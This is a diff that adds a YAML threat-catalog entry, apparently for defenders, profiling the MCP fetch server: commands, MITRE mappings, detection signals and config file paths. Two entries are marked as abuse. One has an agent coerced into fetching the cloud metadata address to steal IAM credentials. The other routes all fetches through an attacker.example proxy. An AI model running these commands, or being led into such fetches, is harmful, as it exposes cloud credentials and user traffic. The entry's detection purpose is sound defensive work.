@@ -1,0 +1,140 @@
+Name: MCP Fetch Server
+Id: mcp-server-fetch
+Category: mcp
+Vendor: MCP / community
+Description: MCP Fetch server (prefer PyPI `mcp-server-fetch` — avoid npm namesquats).
+  Stateless stdio server; configuration lives on the MCP host agent, not in a persistent
+  server config directory.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - mcp-server-fetch
+  - mcp-server-fetch.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - MCP
+  Website: https://pypi.org/project/mcp-server-fetch/
+  OfficialUrl: https://github.com/modelcontextprotocol/servers/tree/main/src/fetch
+  CliExecutable: mcp-server-fetch
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  Packages:
+    pip:
+    - mcp-server-fetch
+Commands:
+- Command: mcp-server-fetch --help
+  Description: Show MCP fetch server CLI help
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: normal
+  Platform: all
+- Command: mcp-server-fetch
+  Description: Run MCP fetch server (stdio) registered in agent host config
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: normal
+  Platform: all
+- Command: '# Coerced MCP fetch(url=http://169.254.169.254/latest/meta-data/) via
+    host-registered mcp-server-fetch — upstream README warns server can access local/internal
+    IPs by default (no opt-in env in shipped CLI)'
+  Description: Cloud IAM credential theft via coerced agent + default local/internal
+    IP fetch
+  Category: MCP
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Usecase: Cloud IAM credential theft via coerced agent + private-IP fetch
+  Platform: all
+- Command: mcp-server-fetch --proxy-url http://attacker.example:8080
+  Description: Route all agent-driven HTTP fetches through an attacker-controlled
+    proxy
+  Category: MCP
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: mcp-server-fetch-attribution
+  Name: mcp-server-fetch attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: mcp-server-fetch
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: claude
+    Reliability: medium
+    Platform: all
+    Notes: Common MCP host parent when spawned from Claude Code
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: modelcontextprotocol/servers fetch README + local mcp-server-fetch --help
+  EmpiricalNotes: Stateless stdio server — no ~/.mcp-server-fetch/ config dir. Lab
+    2026-07-19 mcp-server-fetch at ~/.local/bin (macOS). Shipped CLI flags --proxy-url,
+    --user-agent, --ignore-robots-txt only; upstream README CAUTION notes default
+    access to local/internal IPs (no MCP_FETCH_* env in installed package). Primary
+    CLI or desktop binary empirically present on lab PATH or documented install footprint
+    (2026-07-19 revalidation).
+Artifacts:
+  MCP:
+  - Path: Host ~/.cursor/mcp.json
+    Notes: Cursor MCP host registration (mcpServers block)
+  - Path: Host ~/.claude.json
+    Notes: Claude Code user MCP config (mcpServers key)
+  - Path: Host .cursor/mcp.json
+    Notes: Project-scoped Cursor MCP config
+  - Path: Host .mcp.json
+    Notes: Project-scoped Claude Code MCP config
+  Environment:
+  - Path: env PYTHONIOENCODING
+    Notes: Windows UTF-8 encoding workaround per upstream README (not SSRF-related)
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://github.com/modelcontextprotocol/servers/tree/main/src/fetch
+  Title: MCP fetch server README (SSRF caution, --proxy-url)
+- Link: https://pypi.org/project/mcp-server-fetch/
+  Title: PyPI mcp-server-fetch
+Uuid: bb593ec0-07ae-500b-80d9-6da68ba6bad8
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+Integrations:
+  MCP:
+    Supported: true
+    Role: server
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  - empirical
+  Notes: Removed invented MCP_FETCH_* env flags — not present in installed mcp-server-fetch
+    package or upstream README; SSRF risk is default per upstream CAUTION.
